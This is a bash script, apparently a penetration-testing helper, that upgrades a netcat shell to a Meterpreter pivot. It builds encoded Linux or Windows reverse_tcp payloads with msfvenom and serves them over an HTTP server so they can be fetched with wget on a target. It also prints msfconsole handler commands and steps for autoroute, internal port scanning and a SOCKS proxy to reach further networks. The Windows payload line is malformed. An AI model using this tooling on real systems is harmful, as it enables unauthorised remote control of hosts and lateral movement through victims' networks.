#!/bin/bash

################################################################
#        Simple manager to set up a Meterpreter pivot
#  built to quickly upgrade to a meterpreter pivot from nc shell
#
################################################################

# set workiunug dir
cd /tmp/

# msfvenom generate payload
read -p "[*] Linux or windows payload? (L/W): " payload
read -p "[*] LHOST?: " lhost
read -p "[*] LPORT? " lport
	if [ "$payload" == "L" ];then
   		msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -b "\x00" -e x86/shikata_ga_nai -f elf -o  /tmp/msf-chaos.elf
		echo "-[*] Linux meterpreter payload saved: /tmp/msf-chaos.elf"
	elif [ "$payload" == "W" ];then
   		msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost=$lport -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/msf-chaos.exe
		echo "-[*] Windows meterpreter payload saved: /tmp/msf-chaos.exe"

	else
   	echo "-[!] ERROR: Pass L or W for the payload type"
        exit
	fi

# set up http listerner
echo "[*] starting http listerner for direct wget of payload"
	python -m SimpleHTTPServer 6677 &> /dev/null &
	if [ "$payload" == "L" ];then
echo   "-[*] direct download staged
        ================================================
        wget http://$lhost:6677/msf-chaos.elf
        =================================================
	"
        else
echo   "-[*] direct download staged
        ==================================================
        wget http://$lhost:6677/msf-chaos.exe
        ==================================================
        "
	fi

# set up msf listerner
echo "[*] Configuring MSFConsole"
echo "===========================use the below==========================="
echo "
     |	use exploit/multi/handler
     |	set LHOST $lhost
     |	set LPORT $lport
     |	set ExitOnSession false
     |  lin: set payload linux/x86/meterpreter/reverse_tcp
     |  win: set payload windows/shell/reverse_tcp
     |  exploit -j -z
     |  sessions -u 1 
     "
echo "==================================================================="
echo "         once meterpreter is connected use the following
     |
     | Set up route:     run autoroute -s 10.1.13.0/24 (change subnet)
     | Remot scan  :     use auxiliary/scanner/portscan/tcp (see options)
     | Set proxy for pivot: use auxiliary/server/socks4a  (then set srvport)
     "
echo "==================================================================="
msfconsole
